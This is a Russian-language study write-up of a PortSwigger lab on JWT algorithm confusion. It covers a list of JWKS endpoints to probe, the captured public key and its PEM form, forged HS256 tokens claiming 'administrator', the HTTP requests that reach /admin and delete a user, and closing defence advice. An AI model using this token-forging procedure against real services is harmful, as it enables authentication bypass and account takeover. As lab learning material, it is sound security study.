путаница алгоритмов 

очеень коротко суть:
ну а вся база по этом теме тут [[0_jwt_theory]]

| Шаг из статьи                           | Как это ложится на нашу теорию                                                                                                                                 |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. Раздобыть публичный ключ сервера     | публичный ключ — не секрет. Его можно найти на стандартных эндпоинтах типа `/jwks.json` или даже вытащить из пары старых JWT-токенов                           |
| 2. Сконвертировать ключ в нужный формат | Ключ может быть в JSON (JWK), а серверу нужен PEM. Нужно привести к тому же виду, что и у сервера, иначе подпись не совпадет                                   |
| 3. Изменить JWT                         | cоздаёшь свой токен, ставишь в заголовке `"alg": "HS256"`, а в полезной нагрузке (payload) меняешь данные на то, что хочешь, например `"sub": "administrator"` |
| 4. Подписать токен                      | Берёшь добытый на шаге 1 и сконвертированный на шаге 2 публичный ключ и используешь его как **секрет** для подписи своего токена алгоритмом **HS256** .        |

 Как возникает уязвимость?

библиотеки для проверки JWT часто имеют универсальную функцию `verify(token, key)`. Она смотрит на параметр `alg` в заголовке токена и решает, что делать с ключом:

- если `alg: RS256` — использует ключ как **публичный** (для проверки RSA-подписи)
    
- если `alg: HS256` — использует тот же ключ как **общий секрет** (для HMAC)
    

разработчики часто косячат:  если они всегда передают в `verify()` публичный ключ - думая, что токены всегда будут с `alg: RS256`.
А библиотека слепо верит заголовку

---

#### лаба 
https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion
##### обход аутентификации JWT из-за путаницы алгоритмов
задание:
1 - стырить публич ключ (предоставляется через стандартную конечную точку)
2 - изменяем токен сеанса - меняем алгоритм на симметричны
3 - найденным ключом переподписываем jwt
4 - зайти в админку /admin и удалить карлоса

-----

#### шаг 1 - найти публичный ключ!

вот список JWKS эндпоинтов (это самые топ популярные)
по этим путям может храниться публик кей

```js
/.well-known/jwks.json
/jwks.json
/.well-known/jwks_uri
/.well-known/openid-configuration
/.well-known/openid-configuration/jwks
/openid/connect/jwks.json
/oauth2/v1/keys
/oauth2/jwks
/oauth/jwks
/oauth2/keys
/.well-known/keys
/certs
/oauth2/certs
/oidc/jwks
/oidc/keys
/connect/jwks
/connect/keys
/jwk_uri
/jwk
/keys
/.well-known/oauth-authorization-server/jwks
/.well-known/webfinger?resource=acct:user@domain.com
/.well-known/oauth2/jwks
/oauth2/default/v1/keys
/oauth2/aus8nclwjgSOM9Zem1t7/v1/keys
/token/jwks
/idp/jwks
/auth/jwks
/api/jwks
/v1/jwks
/v2/jwks
/v3/jwks
/public/jwks
/application/jwks
/tenant/jwks
/identity/jwks
/.well-known/jwks
/.well-known/jwk
/.well-known/certs
/.well-known/certificates
/.well-known/public-keys
/.well-known/signing-keys
/jwks.json?app=*
/jwks.json?kid=*
/jwks.json?alg=*
/.well-known/jwks.json?app=*
/.well-known/jwks.json?kid=*
/.well-known/jwks.json?alg=*
/authorizationserver/.well-known/jwks.json
/authorizationserver/.well-known/openid-configuration
/PRRestService/oauth2/v1/token/keys
/prweb/PRRestService/oauth2/v1/token/keys
/service_accounts/v1/metadata/jwk/signer
/oauth2/v3/certs
/.well-known/attestation-pki-root
/openid/v1/jwks
/oauth2/token/keys
/oauth2/jwks_uri
/oauth2/keys.json
/jwk_set
/jwk.json
```

запускаю турбо интрудер
```http
GET %s HTTP/1.1
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU2MDI5NSwic3ViIjoid2llbmVyIn0.JO_SQCx11IxyHqTXz1P1R8idHh0BRbeWRXqIVoCNmQ8L5-rL3ZNL9wzP_X_OiPWkQYV0X2f57fZcZRIQAWaG11qBcYt5Fo6iNbUBxUJDmRL5me0LJVzDROvcMxVphc9jE7N08IWz0ZEq1Mzn22gOVUQlTDb1MtG4RqWAofB9R_AnIxusvf9cru9Dpxn8XEas_NCSUI7aBq7W4IRropX5oYZSKj2wRfPp0mInwlD0lo_eenk9arl-EtLmBPtGkFTeUqkzQs46ZCQHFy4czU6jXL82uVLNUyo88TFkh8ODJ9u57btVzxbVs1duF6oHr8ti4Q2j413pzEDyjs8O1U62HQ
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

и успех!
4 из них дали путь к файлу /jwks.json 
ура - у меня есть публичный ключ!

```json
то что нашел

{"keys":[

{"kty":"RSA",
"e":"AQAB",
"use":"sig",
"kid":"470dda9d-ceff-4952-8b3a-5161e24e2058",
"alg":"RS256",
"n":"6VDQWOJLQEZTCNQhtidSvDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212-344XAC5BsjBf0fNGgxM8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quDPhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz-4dOSOEnQRfn4equSvBI3uK-mImtXXyoB3b0WEWpSn_UIuXH01csb5o8NoNoGzH_GnQnvmDq05194KkZ20xiCOIk74vH37tRvBHwTHHVl3hWKXF8TVhdiL-ZfwdvqleI0gFW4_UxxAJoB7PKSyFQES9g3-9rY3Q"
}

]}

```

<img src="../../assets/234334344442026-03-022.10.00.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />




----

#### шаг 2 - привести полученный ключ к виду как в оригинал запросе

проанализирую свой JWT который приходит в оригинальном запросе
```http
GET /my-account?id=wiener HTTP/2
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU2MDI5NSwic3ViIjoid2llbmVyIn0.JO_SQCx11IxyHqTXz1P1R8idHh0BRbeWRXqIVoCNmQ8L5-rL3ZNL9wzP_X_OiPWkQYV0X2f57fZcZRIQAWaG11qBcYt5Fo6iNbUBxUJDmRL5me0LJVzDROvcMxVphc9jE7N08IWz0ZEq1Mzn22gOVUQlTDb1MtG4RqWAofB9R_AnIxusvf9cru9Dpxn8XEas_NCSUI7aBq7W4IRropX5oYZSKj2wRfPp0mInwlD0lo_eenk9arl-EtLmBPtGkFTeUqkzQs46ZCQHFy4czU6jXL82uVLNUyo88TFkh8ODJ9u57btVzxbVs1duF6oHr8ti4Q2j413pzEDyjs8O1U62HQ
Cache-Control: max-age=0
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

```json
разбор

хедер
{"kid":"470dda9d-ceff-4952-8b3a-5161e24e2058","alg":"RS256"}

пейлоад
{"iss":"portswigger","exp":1772560295,"sub":"wiener"}

здоровая подпись

JO_SQCx11IxyHqTXz1P1R8idHh0BRbeWRXqIVoCNmQ8L5-rL3ZNL9wzP_X_OiPWkQYV0X2f57fZcZRIQAWaG11qBcYt5Fo6iNbUBxUJDmRL5me0LJVzDROvcMxVphc9jE7N08IWz0ZEq1Mzn22gOVUQlTDb1MtG4RqWAofB9R_AnIxusvf9cru9Dpxn8XEas_NCSUI7aBq7W4IRropX5oYZSKj2wRfPp0mInwlD0lo_eenk9arl-EtLmBPtGkFTeUqkzQs46ZCQHFy4czU6jXL82uVLNUyo88TFkh8ODJ9u57btVzxbVs1duF6oHr8ti4Q2j413pzEDyjs8O1U62HQ

```

вижу что и найденный мной паблик кей - json
и в ориг запросе тоже jwt в  - json

#### шаг 3 -  изменить хедер HS256 и пейлоад

```json
оригинал
хедер
{"kid":"470dda9d-ceff-4952-8b3a-5161e24e2058","alg":"RS256"}

пейлоад
{"iss":"portswigger","exp":1772560295,"sub":"wiener"}

-----------------

меняю на 


хедер
{"kid":"470dda9d-ceff-4952-8b3a-5161e24e2058","alg":"HS256"}

пейлоад
{"iss":"portswigger","exp":1772560295,"sub":"administrator"}


```


#### шаг 4 -  подписать JWT публичным ключом!

иду в JWT editor

new RCA key
потом беру  ключ каоторый я нашел

```js
{"keys":[

{"kty":"RSA",
"e":"AQAB",
"use":"sig",
"kid":"470dda9d-ceff-4952-8b3a-5161e24e2058",
"alg":"RS256",
"n":"6VDQWOJLQEZTCNQhtidSvDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212-344XAC5BsjBf0fNGgxM8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quDPhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz-4dOSOEnQRfn4equSvBI3uK-mImtXXyoB3b0WEWpSn_UIuXH01csb5o8NoNoGzH_GnQnvmDq05194KkZ20xiCOIk74vH37tRvBHwTHHVl3hWKXF8TVhdiL-ZfwdvqleI0gFW4_UxxAJoB7PKSyFQES9g3-9rY3Q"
}

]}

-------

из него мне нужно только 

{
    "kty": "RSA",
    "kid": "470dda9d-ceff-4952-8b3a-5161e24e2058",
    "e": "AQAB",
    "n": "6VDQWOJLQEZTCNQhtidSvDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212-344XAC5BsjBf0fNGgxM8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quDPhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz-4dOSOEnQRfn4equSvBI3uK-mImtXXyoB3b0WEWpSn_UIuXH01csb5o8NoNoGzH_GnQnvmDq05194KkZ20xiCOIk74vH37tRvBHwTHHVl3hWKXF8TVhdiL-ZfwdvqleI0gFW4_UxxAJoB7PKSyFQES9g3-9rY3Q"
}


```



--- 



едем на сайт https://www.authgear.com/tools/jwk-generator

и получаем долгожданный PEM
```js
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6VDQWOJLQEZTCNQhtidS
vDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212+344XAC5BsjBf0fNGgxM
8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quD
PhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz+4dOSOEnQRfn4equSvBI3uK+mImtX
XyoB3b0WEWpSn/UIuXH01csb5o8NoNoGzH/GnQnvmDq05194KkZ20xiCOIk74vH3
7tRvBHwTHHVl3hWKXF8TVhdiL+ZfwdvqleI0gFW4/UxxAJoB7PKSyFQES9g3+9rY
3QIDAQAB
-----END PUBLIC KEY-----
```

<img src="../../assets/2026-03-0323.04.54.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



теперь этот полученный пем .

иду на сайт https://www.jwt.io/

подставляю хедер + пейлоад + пем 
и получаю jwt
```js
в хедер

{
  "kid": "470dda9d-ceff-4952-8b3a-5161e24e2058",
  "alg": "HS256"
}

в пейлоад

{
  "iss": "portswigger",
  "exp": 1772565596,
  "sub": "administrator"
}

в секрет

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6VDQWOJLQEZTCNQhtidS
vDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212+344XAC5BsjBf0fNGgxM
8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quD
PhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz+4dOSOEnQRfn4equSvBI3uK+mImtX
XyoB3b0WEWpSn/UIuXH01csb5o8NoNoGzH/GnQnvmDq05194KkZ20xiCOIk74vH3
7tRvBHwTHHVl3hWKXF8TVhdiL+ZfwdvqleI0gFW4/UxxAJoB7PKSyFQES9g3+9rY
3QIDAQAB
-----END PUBLIC KEY-----
```

```json
eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU2NTU5Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ln8wrYP3AU28mUzbiSaor4D_pyK2Ob48fHBF2FC3qdU
```

<img src="../../assets/2026-03-0323.57.46.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />




подставляю сюда
```http
GET /admin HTTP/2
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU2NTU5Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ln8wrYP3AU28mUzbiSaor4D_pyK2Ob48fHBF2FC3qdU
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

ответ


```http
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
Set-Cookie: session=; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 2725

<!DOCTYPE html>
<html>
<!--LAB_HEAD_ST
```

хз - в чем дело.....

-----

в офиц решении написано

Используйте вкладку "Декодер", чтобы закодировать этот PEM-ключ в Base64, затем скопируйте полученную строку. Вернитесь на вкладку "Ключи редактора JWT" на главной панели вкладок Burp. Нажмите "Создать симметричный ключ". ... Замените сгенерированное значение для свойства k на PEM в кодировке Base64, которое вы только что создали.

------

----

окей - делаю как в офиц решении:

беру свой  пем
```js
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6VDQWOJLQEZTCNQhtidS
vDBRjLWVVoZw491tB0OxiCuRl4AUR3hefK5Nqqu1u212+344XAC5BsjBf0fNGgxM
8vlwbrzpANToQxnRudpRpPLDc5xVbbEHQPtYNOUW0b3wlRyw2MdQ3LbRSsxd9quD
PhmZwW1GwY2V0HNnhRWB5DyezZuKbC98oBz+4dOSOEnQRfn4equSvBI3uK+mImtX
XyoB3b0WEWpSn/UIuXH01csb5o8NoNoGzH/GnQnvmDq05194KkZ20xiCOIk74vH3
7tRvBHwTHHVl3hWKXF8TVhdiL+ZfwdvqleI0gFW4/UxxAJoB7PKSyFQES9g3+9rY
3QIDAQAB
-----END PUBLIC KEY-----

```

Забыл \n в конце PEM

 НО СУКА САМОЕ ВАЖНОЕ В ЭТОМ _ ЧТО Я НЕ ДОГАДАЛСЯ СРАЗУ И ТУПИЛ НЕСКОЛЬКО ЧАСОВ ПЕРЕБИРАЯ ВЕСЬ ИНТЕРНЕТ НА СВЕТЕ - ЭТО ТО - --- ЧТО ОБЯЗАТЕЛЬНО НУЖНО СДЕЛАТЬ ПУСТОЙ ПЕРЕНОС СТРОКИ В КОНЦЕ ПОСЛЕ -END PUBLIC KEY----- ВОТ ТУТ!!!  И ТОГДА ПОСЛЕ ШИФРОВКИ В base64 ШИФРОВАННАЯ СТРОКА БУДЕТ ЗАКАНЧИВАТСЬЯ НА DIEtFWS0tLS0tCg==  (ВОТ ЭТИ РАВНО ЗНАКИ) И ТОГДА - СЕРВЕР ЕЕ СЧИТАЕТ ЦЕЛОЙ!!! И ВСЕ РАБОТАЕТ УСПЕШНО!!!



кодирую в base64
'то будущий секрет для HMAC-ключа
```js
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE2VkRRV09KTFFFWlRDTlFodGlkUwp2REJSakxXVlZvWnc0OTF0QjBPeGlDdVJsNEFVUjNoZWZLNU5xcXUxdTIxMiszNDRYQUM1QnNqQmYwZk5HZ3hNCjh2bHdicnpwQU5Ub1F4blJ1ZHBScFBMRGM1eFZiYkVIUVB0WU5PVVcwYjN3bFJ5dzJNZFEzTGJSU3N4ZDlxdUQKUGhtWndXMUd3WTJWMEhObmhSV0I1RHllelp1S2JDOThvQnorNGRPU09FblFSZm40ZXF1U3ZCSTN1SyttSW10WApYeW9CM2IwV0VXcFNuL1VJdVhIMDFjc2I1bzhOb05vR3pIL0duUW52bURxMDUxOTRLa1oyMHhpQ09Jazc0dkgzCjd0UnZCSHdUSEhWbDNoV0tYRjhUVmhkaUwrWmZ3ZHZxbGVJMGdGVzQvVXh4QUpvQjdQS1N5RlFFUzlnMys5clkKM1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
```
этот ключ неверный оказался!!!
как понять? а легко!
он должен был кончаться на == 
```d
вот так примерно!
...5RlFFUzlnMys5clkKM1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==

вот эти два равно в конце - очень цука важно
```


создал симметричный ключ
нажал генерейт
и
в парамметр k подставляю тот ключ что кодировал в base64
```js

{  
    "kty": "oct",  
    "kid": "470dda9d-ceff-4952-8b3a-5161e24e2058",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE2VkRRV09KTFFFWlRDTlFodGlkUwp2REJSakxXVlZvWnc0OTF0QjBPeGlDdVJsNEFVUjNoZWZLNU5xcXUxdTIxMiszNDRYQUM1QnNqQmYwZk5HZ3hNCjh2bHdicnpwQU5Ub1F4blJ1ZHBScFBMRGM1eFZiYkVIUVB0WU5PVVcwYjN3bFJ5dzJNZFEzTGJSU3N4ZDlxdUQKUGhtWndXMUd3WTJWMEhObmhSV0I1RHllelp1S2JDOThvQnorNGRPU09FblFSZm40ZXF1U3ZCSTN1SyttSW10WApYeW9CM2IwV0VXcFNuL1VJdVhIMDFjc2I1bzhOb05vR3pIL0duUW52bURxMDUxOTRLa1oyMHhpQ09Jazc0dkgzCjd0UnZCSHdUSEhWbDNoV0tYRjhUVmhkaUwrWmZ3ZHZxbGVJMGdGVzQvVXh4QUpvQjdQS1N5RlFFUzlnMys5clkKM1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"  
}

```

далее этим ключом нужно подписать свой JWT через sign в Json web token вкладке в репитере!

и получаем уже готовый jwt

подставил jwt сюда 
```http
GET /admin HTTP/2
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU2NTU5Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.5T8Eb_G7GaPQ8KY9CzDeLlzRQzbATX1pCh5xSt3fCdU
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```



ответ 
```http
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
Set-Cookie: session=; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 2725

```

(пишу постфактум - НЕ ПОЛУЧИЛОСЬ потому - что не добавил перенос строки перед тем как  шифровать PEM в base 64)
если бы сразу так сделал - проблем бы не было

------------


это шляпа какая-то а не лаба!!

возможно проблема в переносах строк!
когда я создаю этот пем!! (так и оказалось потом..)


лабу решил.. 
## ❌❌❌ САМОЕ ВАЖНОЕ !!!!

сейчас кратко: как решить лабу: не забыть \n в конце PEM перед шифровкой
 
- 1 - нахожу файл   /jwks.json 
- 2 - беру из файла только то - что внутри квадр скоб : { kid..e..n.. } 
- 3 - далее из эттго нужно поулчить PEM  на сайте https://www.authgear.com/tools/jwk-generator легко делаю это (burp тупит в этом деле у меня (или я туплю))
- 4 - полученный PEM вместе со строками -----BE....C KEY----- все берем и отправляем  в декодер - нужно кодировать в base 64 - НО СУКА САМОЕ ВАЖНОЕ В ЭТОМ _ ЧТО Я НЕ ДОГАДАЛСЯ СРАЗУ И ТУПИЛ НЕСКОЛЬКО ЧАСОВ ПЕРЕБИРАЯ ВЕСЬ ИНТЕРНЕТ НА СВЕТЕ - ЭТО ТО - --- ЧТО ОБЯЗАТЕЛЬНО НУЖНО СДЕЛАТЬ ПУСТОЙ ПЕРЕНОС СТРОКИ В КОНЦЕ ПОСЛЕ -END PUBLIC KEY----- ВОТ ТУТ!!!  И ТОГДА ПОСЛЕ ШИФРОВКИ В base64 ШИФРОВАННАЯ СТРОКА БУДЕТ ЗАКАНЧИВАТСЬЯ НА DIEtFWS0tLS0tCg==  (ВОТ ЭТИ РАВНО ЗНАКИ) И ТОГДА - СЕРВЕР ЕЕ СЧИТАЕТ ЦЕЛОЙ!!! И ВСЕ РАБОТАЕТ УСПЕШНО!!!
- 5 - дальше беру эту кодированную строку и созадю симметричный ключ в Jwt editor - генерирую новый ключик - и в параметр k  подставляю эту мою строку шифрованную с == на конце которая должна быть обязательно!
- 6 - дальше все просто - этим ключом нужно подписать свой JWT в котором я указал  HS256 и  administrator

```c
{  
    "kid": "470dda9d-ceff-4952-8b3a-5161e24e2058",  
    "alg": "HS256"  
}

и

{  
    "iss": "portswigger",  
    "exp": 1772570227,  
    "sub": "administrator"  
}
```
7. отправляю запрос на /admin
8. потом на  /admin/delete?username=carlos
9. лаба решена!

 ---
 5 часов я тупил - уперто пытаюсь решить эту проклятую лабу!!!

и вот у меня получилось..  я просто Забыл \n в конце PEM..

запрос
```http
GET /admin HTTP/2
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU3MDIyNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.WF_z4oB5rWeGcSMzDlKeiUlpChw1RFZYO3SV0Z4ujjQ
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

ответ 200 - попал в админку

<img src="../../assets/2026-03-0400.55.37.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />

 



```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a2100fc0439d86f827e07a400a100c5.web-security-academy.net
Cookie: session=eyJraWQiOiI0NzBkZGE5ZC1jZWZmLTQ5NTItOGIzYS01MTYxZTI0ZTIwNTgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjU3MDIyNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.WF_z4oB5rWeGcSMzDlKeiUlpChw1RFZYO3SV0Z4ujjQ
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2100fc0439d86f827e07a400a100c5.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
овтет 302 -карлос удален - лаба решена

---------

моя ошибка тут была missing newline тупо перенос строки... кто ж знал - что его нужно добавить туда!

было              "-----END PUBLIC KEY-----"
нужно было  "-----END PUBLIC KEY-----\n"


`...5RlFFUzlnMys5clkKM1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==`
Эти `Cg==` в конце — это как раз закодированный символ перевода строки. Если их нет — сервер говорит "не та подпись"


-----



 #### почему возникает уязвимость: 

сервер использует асимметричный алгоритм типа RS256, но библиотека проверки JWT позволяет клиенту выбирать алгоритм через параметр alg в заголовке 
Если разработчик всегда передает в функцию verify публичный ключ, а злоумышленник меняет alg на HS256, библиотека воспринимает публичный ключ как общий секрет для HMAC, и атакующий подписывает токен этим публичным ключом, который обычно легко доступен через /.well-known/jwks.json

 #### как быстро обнаружить: 

ну сперва найти публичный ключ... а потом уже:
перехватить JWT, изменить alg на HS256 и попробовать подписать его публичным ключом с сервера 
и если сервер принимает — уязвимость есть 

#### как защититься: 

всегда жестко задавайте ожидаемый алгоритм в коде, не берите его из заголовка токена 
Используйте белые списки разрешенных алгоритмов, разделяйте код для симметричных и асимметричных алгоритмов 
Обновляйте библиотеки JWT до актуальных версий, где эта проблема уже исправлена Включайте проверку issuer и audience, никогда не доверяйте заголовку токена до проверки подписи

не забывать перенос строки

этот перенос строки я запомню на всю жизнь...